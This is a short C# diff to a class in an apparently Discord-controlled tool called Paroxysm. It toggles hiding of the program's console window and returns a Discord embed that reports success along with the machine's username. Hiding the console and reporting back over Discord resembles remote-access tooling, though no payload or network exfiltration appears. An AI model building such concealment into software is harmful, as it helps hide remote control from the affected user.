@@ -1,13 +1,17 @@
-﻿using Paroxysm.Tools;
+﻿using Discord;
+using Paroxysm.Tools;
 
 namespace Paroxysm.Hooks.Actions;
 
 public static class ConsoleAction
 {
-    public static void Follow()
+    public static Embed Follow()
     {
         Settings.ConsoleClosed = !Settings.ConsoleClosed;
-        IntPtr handle = HookStatement.GetConsoleWindow();
+        var handle = HookStatement.GetConsoleWindow();
         HookStatement.ShowWindow(handle, Settings.ConsoleClosed ? HookStatement.SW_HIDE : HookStatement.SW_RESTORE);
+
+        return EmbedCreator.CreateWithText(Color.Green, "Command was executed successfully",
+            "Console action has been triggered", Environment.UserName, null);
     }
 }
